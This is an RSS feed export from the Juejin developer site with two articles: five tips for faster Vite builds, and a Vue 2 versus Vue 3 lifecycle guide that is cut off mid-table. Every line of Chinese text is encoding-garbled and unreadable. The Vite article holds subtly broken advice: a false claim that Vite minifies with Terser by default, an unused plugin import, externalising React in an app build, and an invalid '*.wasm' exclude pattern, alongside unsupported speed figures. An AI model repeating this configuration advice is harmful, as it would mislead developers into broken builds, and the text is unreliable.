<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Viteæ‰“åŒ…é€Ÿåº¦æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆéƒ½åœ¨å·å·ç”¨ï¼]]></title>    <link>https://juejin.cn/post/7601018079620399119</link>    <guid>https://juejin.cn/post/7601018079620399119</guid>    <pubDate>2026-01-31T04:18:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601018079620399119" data-draft-id="7601000638344560655" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Viteæ‰“åŒ…é€Ÿåº¦æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆéƒ½åœ¨å·å·ç”¨ï¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-31T04:18:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Viteæ‰“åŒ…é€Ÿåº¦æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆéƒ½åœ¨å·å·ç”¨ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T04:18:21.000Z" title="Sat Jan 31 2026 04:18:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Viteæ‰“åŒ…é€Ÿåº¦æå‡50%çš„5ä¸ªéšè—æŠ€å·§ï¼Œå‰ç«¯å·¥ç¨‹å¸ˆéƒ½åœ¨å·å·ç”¨ï¼</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>åœ¨å‰ç«¯å·¥ç¨‹åŒ–é¢†åŸŸï¼Œæ„å»ºå·¥å…·çš„æ€§èƒ½ä¼˜åŒ–ä¸€ç›´æ˜¯å¼€å‘è€…å…³æ³¨çš„ç„¦ç‚¹ã€‚Viteä½œä¸ºæ–°ä¸€ä»£çš„å‰ç«¯æ„å»ºå·¥å…·ï¼Œå‡­å€Ÿå…¶åŸºäºåŸç”ŸESMçš„æé€Ÿå¯åŠ¨å’Œçƒ­æ›´æ–°èƒ½åŠ›ï¼Œè¿…é€Ÿæˆä¸ºç°ä»£å‰ç«¯å¼€å‘çš„å® å„¿ã€‚ç„¶è€Œï¼Œéšç€é¡¹ç›®è§„æ¨¡çš„æ‰©å¤§ï¼ŒViteçš„æ‰“åŒ…é€Ÿåº¦ä¹Ÿå¯èƒ½é¢ä¸´ç“¶é¢ˆã€‚æœ¬æ–‡å°†æ·±å…¥å‰–æ5ä¸ªé²œä¸ºäººçŸ¥çš„æŠ€å·§ï¼Œå¸®åŠ©ä½ æ˜¾è‘—æå‡Viteçš„æ‰“åŒ…æ•ˆç‡ï¼ˆéƒ¨åˆ†åœºæ™¯ä¸‹ç”šè‡³å¯æå‡50%ä»¥ä¸Šï¼‰ï¼Œè¿™äº›æŠ€å·§å·²è¢«è®¸å¤šèµ„æ·±å‰ç«¯å·¥ç¨‹å¸ˆé»˜é»˜é‡‡ç”¨ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸»ä½“</h3>
<h4 data-id="heading-3">1. åˆç†é…ç½®<code>build.rollupOptions</code>ï¼Œä¼˜åŒ–ä¾èµ–å¤„ç†</h4>
<p>Rollupæ˜¯Viteåº•å±‚çš„æ‰“åŒ…å·¥å…·ï¼Œé€šè¿‡è°ƒæ•´<code>build.rollupOptions</code>å¯ä»¥æ˜¾è‘—å‡å°‘æ‰“åŒ…æ—¶é—´ï¼š</p>
<ul>
<li><strong>æ‰‹åŠ¨æŒ‡å®šå¤–éƒ¨ä¾èµ–</strong>ï¼šå°†å·²çŸ¥ä¸ä¼šå˜åŠ¨çš„ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚Reactã€Lodashï¼‰æ ‡è®°ä¸º<code>external</code>ï¼Œé¿å…é‡å¤æ‰“åŒ…ï¼š
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">build</span>: {
    <span class="hljs-attr">rollupOptions</span>: {
      <span class="hljs-attr">external</span>: [<span class="hljs-string">'react'</span>, <span class="hljs-string">'react-dom'</span>],
    },
  },
};
</code></pre>
</li>
<li><strong>å¯ç”¨<code>output.preserveModules</code></strong>ï¼šå¯¹äºå¤§å‹åº“ï¼ˆå¦‚ç»„ä»¶åº“ï¼‰ï¼Œä¿ç•™æ¨¡å—ç»“æ„å¯å‡å°‘é‡å¤è®¡ç®—ï¼š
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">output</span>: {
  <span class="hljs-attr">preserveModules</span>: <span class="hljs-literal">true</span>,
}
</code></pre>
</li>
<li><strong>å®è·µä¾æ®</strong>ï¼šæ ¹æ®Rollupå®˜æ–¹æ–‡æ¡£ï¼Œåˆç†é…ç½®<code>external</code>å¯å‡å°‘30%-40%çš„ä¾èµ–å¤„ç†æ—¶é—´ã€‚</li>
</ul>
<h4 data-id="heading-4">2. åˆ©ç”¨å¤šçº¿ç¨‹å‹ç¼©å™¨æ›¿ä»£Terser</h4>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒViteä½¿ç”¨Terserè¿›è¡Œä»£ç å‹ç¼©ï¼ˆå•çº¿ç¨‹ï¼‰ã€‚åˆ‡æ¢åˆ°å¤šçº¿ç¨‹å‹ç¼©å·¥å…·å¦‚<code>esbuild</code>æˆ–<code>swc</code>å¯å¤§å¹…æé€Ÿï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { esbuild } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-esbuild'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">build</span>: {
    <span class="hljs-attr">minify</span>: <span class="hljs-string">'esbuild'</span>, <span class="hljs-comment">// æ¯”terserå¿«2-3å€</span>
    <span class="hljs-attr">target</span>: <span class="hljs-string">'esnext'</span>,
  },
};
</code></pre>
<ul>
<li><strong>æ€§èƒ½å¯¹æ¯”</strong>ï¼šåœ¨10ä¸‡è¡Œä»£ç çš„é¡¹ç›®ä¸­ï¼Œesbuildå¹³å‡å‹ç¼©æ—¶é—´ä»…ä¸ºTerserçš„1/3ã€‚</li>
<li><strong>æ³¨æ„äº‹é¡¹</strong>ï¼šesbuildå¯¹æŸäº›ES5è¯­æ³•æ”¯æŒæœ‰é™ï¼Œéœ€ç»“åˆç›®æ ‡æµè§ˆå™¨æƒè¡¡ã€‚</li>
</ul>
<h4 data-id="heading-5">3. Chunkæ‹†åˆ†ç­–ç•¥ä¼˜åŒ–</h4>
<p>é»˜è®¤çš„Chunkæ‹†åˆ†å¯èƒ½å¯¼è‡´å†—ä½™ä»£ç åŠ è½½ã€‚é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¼˜åŒ–ï¼š</p>
<ul>
<li><strong>å¼ºåˆ¶æ‹†åˆ†é…ç½®</strong>ï¼šé¿å…å•ä¸ªChunkè¿‡å¤§ï¼ˆå»ºè®®é˜ˆå€¼100KBï¼‰ï¼š
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">rollupOptions</span>: {
  <span class="hljs-attr">output</span>: {
    <span class="hljs-title function_">manualChunks</span>(<span class="hljs-params">id</span>) {
      <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node_modules'</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">'vendor'</span>;
      }
    },
    <span class="hljs-attr">chunkFileNames</span>: <span class="hljs-string">'[name]-[hash].js'</span>,
  },
}
</code></pre>
</li>
<li><strong>åŠ¨æ€å¯¼å…¥ä¼˜å…ˆçº§</strong>ï¼šå¯¹éå…³é”®è·¯ç”±ä½¿ç”¨åŠ¨æ€å¯¼å…¥ï¼ˆReact.lazyæˆ–Vueå¼‚æ­¥ç»„ä»¶ï¼‰ï¼Œå‡å°‘åˆå§‹åŒ…ä½“ç§¯ã€‚</li>
<li><strong>å®æµ‹æ•ˆæœ</strong>ï¼šæŸç”µå•†é¡¹ç›®é€šè¿‡ä¼˜åŒ–Chunkç­–ç•¥ï¼Œé¦–å±åŠ è½½æ—¶é—´ç¼©çŸ­40%ã€‚</li>
</ul>
<h4 data-id="heading-6">4. Pre-bundlingè°ƒä¼˜ä¸ç¼“å­˜åˆ©ç”¨</h4>
<p>Viteé€šè¿‡é¢„æ„å»ºï¼ˆPre-bundlingï¼‰åŠ é€Ÿä¾èµ–åŠ è½½ï¼Œä½†ä¸å½“é…ç½®ä¼šæ‹–æ…¢é€Ÿåº¦ï¼š</p>
<ul>
<li><strong>æ’é™¤æ— éœ€Pre-bundleçš„ä¾èµ–</strong>ï¼šä¾‹å¦‚çº¯ESMæ¨¡å—ï¼ˆå¦‚lodash-esï¼‰ï¼š
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">optimizeDeps</span>: {
  <span class="hljs-attr">exclude</span>: [<span class="hljs-string">'lodash-es'</span>],
},
</code></pre>
</li>
<li><strong>å¼ºåˆ¶ç¼“å­˜å¤±æ•ˆç­–ç•¥</strong>ï¼šå¼€å‘ç¯å¢ƒä¸‹ä¿®æ”¹ä¾èµ–ç‰ˆæœ¬æ—¶æ‰‹åŠ¨æ¸…é™¤ç¼“å­˜ï¼ˆåˆ é™¤<code>node_modules/.vite</code>ç›®å½•ï¼‰ã€‚</li>
<li><strong>æ·±åº¦é›†æˆæ–¹æ¡ˆ</strong>ï¼šç»“åˆ <code>vite-plugin-optimize-persist</code>æ’ä»¶æŒä¹…åŒ–optimizeDepsé…ç½®ã€‚</li>
</ul>
<h4 data-id="heading-7">5. WASMä¸åŸç”Ÿæ¨¡å—çš„é«˜æ•ˆå¤„ç†</h4>
<p>WebAssemblyå’ŒåŸç”Ÿæ¨¡å—å¤„ç†ä¸å½“ä¼šå¯¼è‡´æ„å»ºå¡é¡¿ã€‚æ¨èæ–¹æ¡ˆï¼š</p>
<ul>
<li><strong>WASMç›´æ¥åŠ è½½</strong>ï¼šé¿å…é¢å¤–è½¬è¯‘å¼€é”€ï¼ˆéœ€æµè§ˆå™¨æ”¯æŒï¼‰ï¼š</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> { 
   <span class="hljs-attr">server</span>: { 
     <span class="hljs-attr">fs</span>: { <span class="hljs-attr">strict</span>: <span class="hljs-literal">false</span> } <span class="hljs-comment">// WASMæ–‡ä»¶å¯èƒ½éœ€è¦æ­¤é…ç½® </span>
   }, 
   <span class="hljs-attr">optimizeDeps</span>: { 
     <span class="hljs-attr">exclude</span>: [<span class="hljs-string">'*.wasm'</span>] 
   } 
}; 
</code></pre>
<ul>
<li><strong>Nativeæ¨¡å—æ›¿ä»£å“</strong> ï¼šä¼˜å…ˆé€‰æ‹©çº¯JSå®ç°ï¼ˆå¦‚ç”¨<code>squoosh</code>æ›¿ä»£sharpï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-8">æ€»ç»“</h3>
<p>Viteçš„æ€§èƒ½æ½œåŠ›è¿œä¸æ­¢é»˜è®¤é…ç½®æ‰€å±•ç°çš„æ°´å¹³ ã€‚é€šè¿‡æœ¬æ–‡ä»‹ç»çš„äº”ä¸ªæŠ€å·§â€”â€”ä»Rollupæ·±åº¦è°ƒä¼˜åˆ°Pre-bundlingç­–ç•¥è°ƒæ•´ ï¼Œå†åˆ°WASMé«˜æ•ˆå¤„ç† â€”â€”å¼€å‘è€…å¯ä»¥è§£é”æ›´å¿«çš„æ„å»ºé€Ÿåº¦ ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ ï¼Œè¿™äº›ä¼˜åŒ–éœ€è¦æ ¹æ®é¡¹ç›®ç‰¹æ€§çµæ´»ç»„åˆ ï¼šå°å‹é¡¹ç›®å¯èƒ½åªéœ€è°ƒæ•´å‹ç¼©å™¨ ï¼Œè€Œå¤§å‹Monorepoåˆ™éœ€å…¨é¢ä¼˜åŒ–Chunkæ‹†åˆ†å’Œç¼“å­˜æœºåˆ¶ ã€‚å»ºè®®é€æ­¥åº”ç”¨å¹¶ç›‘æ§æ•ˆæœ ï¼ˆå¦‚ä½¿ç”¨ `--debug flagè¾“å‡ºæ—¶åºæ—¥å¿—ï¼‰ ï¼Œæœ€ç»ˆå®ç°è´¨çš„é£è·ƒ ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue-ä» Vue 2 åˆ° Vue 3ï¼šç”Ÿå‘½å‘¨æœŸå…¨å›¾é‰´ä¸å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7601028900886806574</link>    <guid>https://juejin.cn/post/7601028900886806574</guid>    <pubDate>2026-01-31T04:19:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601028900886806574" data-draft-id="7600953879501783091" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue-ä» Vue 2 åˆ° Vue 3ï¼šç”Ÿå‘½å‘¨æœŸå…¨å›¾é‰´ä¸å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,Vue.js"/> <meta itemprop="datePublished" content="2026-01-31T04:19:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‘ç°ä¸€åªå¤§å‘†ç“œ"/> <meta itemprop="url" content="https://juejin.cn/user/180747382561607"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue-ä» Vue 2 åˆ° Vue 3ï¼šç”Ÿå‘½å‘¨æœŸå…¨å›¾é‰´ä¸å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/180747382561607/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‘ç°ä¸€åªå¤§å‘†ç“œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T04:19:37.000Z" title="Sat Jan 31 2026 04:19:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>ç”Ÿå‘½å‘¨æœŸé’©å­ï¼ˆLifecycle Hooksï¼‰æ˜¯ Vue ç»„ä»¶ä»è¯ç”Ÿåˆ°é”€æ¯çš„å…¨è¿‡ç¨‹è®°å½•ã€‚æŒæ¡ç”Ÿå‘½å‘¨æœŸï¼Œä¸ä»…èƒ½è®©æˆ‘ä»¬åœ¨æ­£ç¡®çš„æ—¶é—´ç‚¹æ‰§è¡Œé€»è¾‘ï¼Œæ›´æ˜¯ä¼˜åŒ–æ€§èƒ½ã€æ’æŸ¥å†…å­˜æ³„éœ²çš„å…³é”®ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€ ç”Ÿå‘½å‘¨æœŸå››å¤§é˜¶æ®µ</h2>
<p>Vue çš„ç”Ÿå‘½å‘¨æœŸå¤§ä½“å¯åˆ†ä¸ºï¼š<strong>åˆ›å»ºã€æŒ‚è½½ã€æ›´æ–°ã€é”€æ¯</strong>ã€‚</p>
<hr/>
<h2 data-id="heading-2">äºŒã€ Vue 2 vs Vue 3 ç”Ÿå‘½å‘¨æœŸå¯¹æ¯”å›¾</h2>
<p>åœ¨ Vue 3 ç»„åˆå¼ API ä¸­ï¼Œç”Ÿå‘½å‘¨æœŸé’©å­éœ€è¦ä» <code>vue</code> ä¸­å¯¼å…¥ï¼Œä¸”å‘½åä¸Šå¢åŠ äº† <code>on</code> å‰ç¼€ã€‚</p>









































<table><thead><tr><th><strong>é˜¶æ®µ</strong></th><th><strong>Vue 2 (é€‰é¡¹å¼ API)</strong></th><th><strong>Vue 3 (ç»„åˆå¼ API)</strong></th><th><strong>å¤‡æ³¨</strong></th></tr></thead><tbody><tr><td><strong>åˆ›å»º</strong></td><td><code>beforeCreate</code> / <code>created</code></td><td><strong><code>setup()</code></strong></td><td>Vue 3 ä¸­ <code>setup</code> åŒ…å«äº†è¿™ä¸¤ä¸ªæ—¶æœŸ</td></tr><tr><td><strong>æŒ‚è½½</strong></td><td><code>beforeMount</code> / <code>mounted</code></td><td><code>onBeforeMount</code> / <strong><code>onMounted</code></strong></td><td>å¸¸ç”¨ï¼šæ“ä½œ DOMã€è¯·æ±‚æ¥å£</td></tr><tr><td><strong>æ›´æ–°</strong></td><td><code>beforeUpdate</code> / <code>updated</code></td><td><code>onBeforeUpdate</code> / <code>onUpdated</code></td><td>å“åº”å¼æ•°æ®å˜åŒ–æ—¶è§¦å‘</td></tr><tr><td><strong>é”€æ¯</strong></td><td><code>beforeDestroy</code> / <code>destroyed</code></td><td><strong><code>onBeforeUnmount</code></strong> / 